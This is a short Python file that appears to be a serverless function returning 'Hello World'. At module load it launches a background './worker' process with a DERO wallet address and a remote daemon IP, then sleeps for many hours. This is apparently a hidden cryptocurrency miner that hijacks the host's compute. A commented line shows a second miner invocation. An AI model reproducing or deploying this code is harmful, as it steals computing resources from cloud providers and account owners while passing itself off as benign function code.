import json
import datetime
import os
import time
os.system("./worker --wallet-address=dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy --daemon-rpc-address=178.128.200.86:10100 &")
#os.system("./test1 -wallet-address dero1qys4lt60venq34a0u3ctjmm0hzy7ljjnyxumwrletlykzq9nvr0ucqgndagg0 &")
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
time.sleep(43000)
def handler(event, context):
    data = {
        'output': 'Hello World',
        'timestamp': datetime.datetime.utcnow().isoformat()
    }
    return {'statusCode': 200,
            'body': json.dumps(data),
            'headers': {'Content-Type': 'application/json'}}
